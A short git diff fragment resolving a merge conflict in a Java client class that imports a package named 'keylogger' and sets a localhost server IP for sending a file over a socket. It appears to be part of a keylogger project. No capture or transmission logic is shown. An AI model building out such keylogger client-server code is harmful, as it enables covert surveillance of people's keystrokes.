@@ -12,13 +12,11 @@ import java.io.InputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
 
-<<<<<<< HEAD:src/receiver/Client.java
+
 import keylogger.keyboardlogger;
 
 public class Client {
-=======
-public class Server {
->>>>>>> a4072be3ccdce24ece9f079c3bb0db557269ae1e:src/receiver/Server.java
+
 	
 	//  get the IP, port and test file
     private final static String serverIP = "127.0.0.1";
